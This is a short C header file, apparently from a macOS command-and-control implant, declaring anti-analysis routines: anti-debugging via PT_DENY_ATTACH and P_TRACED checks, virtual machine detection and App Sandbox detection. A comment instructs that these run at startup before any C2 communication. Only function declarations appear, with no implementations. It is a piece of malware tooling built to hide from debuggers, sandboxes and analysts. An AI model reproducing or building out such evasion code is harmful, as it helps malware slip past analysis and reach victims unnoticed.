#ifndef OPSEC_H
#define OPSEC_H

#include "types.h"

/// OPSEC checks — anti-debug, VM detection, sandbox detection
/// Call opsec_check() at startup before any C2 communication

/// Run all OPSEC checks. Returns 0 if safe, -1 if hostile environment detected.
int opsec_check(void);

/// Individual checks (can be called separately)
int opsec_anti_debug(void);       // PT_DENY_ATTACH + P_TRACED check
int opsec_vm_detect(void);        // VM/hypervisor detection
int opsec_sandbox_detect(void);   // App Sandbox detection

#endif // OPSEC_H
